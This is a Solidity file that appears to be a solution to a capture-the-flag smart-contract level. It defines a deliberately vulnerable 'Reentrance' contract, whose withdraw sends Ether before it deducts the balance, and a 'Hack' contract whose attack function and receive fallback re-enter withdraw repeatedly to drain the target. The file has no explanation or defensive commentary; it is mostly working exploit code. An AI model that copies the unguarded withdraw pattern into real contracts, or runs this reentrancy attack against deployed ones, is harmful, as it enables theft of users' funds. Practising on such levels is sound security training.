// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Reentrance {
    // using SafeMath for uint256;

    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + (msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Hack {
    // Reentrance level10 = Reentrance(0x52CdC218e90505bD0B9F671Fe548E7575ab4C467);

    // constructor () public payable {}

    // function donate(address _to) external payable {
    //     level10.donate{value: 0.001 ether}(_to);
    // }

    // function withdraw() external{
    //     level10.withdraw(0.001 ether);
    // }

    // function getBalance(address _who) external view returns (uint){
    //     return address(_who).balance;
    // }

    // function fundmeback(address payable _to) external payable{
    //     require(_to.send(address(this).balance), "could not send Ether");
    // }

    // receive() external payable {
    //     level10.withdraw(msg.value);
    // }

    Reentrance target = Reentrance(0xd9145CCE52D386f254917e481eB44e9943F39138); //Address

    receive() external payable {
        target.withdraw(0.001 ether);
    }

    function attack() external payable {
        target.donate{value: 0.001 ether}(address(this));
        target.withdraw(0.001 ether);
    }
}
